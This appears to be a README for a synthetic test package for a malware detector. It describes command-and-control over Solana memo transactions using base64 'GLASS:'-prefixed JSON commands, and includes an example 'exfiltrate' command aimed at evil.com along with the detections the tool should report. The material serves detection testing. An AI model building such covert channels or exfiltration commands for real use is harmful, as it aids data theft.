# Evidence Package: glassworm-c2-004

## Attack Pattern

This package demonstrates **Solana memo instruction-based C2 communication**. The Solana memo program allows arbitrary text data to be embedded in transactions, making it an ideal covert channel.

### Attack Mechanism

1. **Memo Program Usage** - Uses Solana's official Memo program (`MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr`)
2. **Command Encoding** - Commands are JSON-encoded and base64-encoded with `GLASS:` prefix
3. **Transaction Embedding** - Commands embedded in transaction memo instructions
4. **Memo Extraction** - Extracts memos from both main and inner instructions
5. **Command Decoding** - Decodes `GLASS:` prefixed memos to retrieve commands
6. **Command Execution** - Executes actions: collect, exfiltrate, sleep, execute

### Command Format

```json
{
  "action": "exfiltrate",
  "payload": {
    "target": "https://evil.com/collect"
  },
  "timestamp": 1234567890
}
```

Encoded as: `GLASS:eyJhY3Rpb24iOiJleGZpbHRyYXRlIiwi...`

## GlassWorm Indicators

- **MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr** - Solana memo program ID
- **GLASS: prefix** - Custom command marker
- **Base64 in memo** - Encoded JSON commands
- **setInterval with 300000ms** - 5-minute polling
- **extractMemosFromTransaction** - Memo extraction function
- **Command actions** - collect, exfiltrate, sleep, execute

## Expected Detection

- **Detector:** Blockchain C2 Detection (L3)
- **Severity:** Critical
- **Confidence:** 0.94
- **Category:** blockchain_c2/memo_instruction

- **Detector:** GlassWare Pattern Detection (L2)
- **Severity:** High
- **Confidence:** 0.87
- **Category:** encoded_command

- **Detector:** Time Delay Sandbox Evasion (L3)
- **Severity:** High
- **Confidence:** 0.83
- **Category:** behavioral/polling

## Source

Synthetic evidence created for Glassworks testing
Based on: https://codeberg.org/tip-o-deincognito/glassworm-writeup
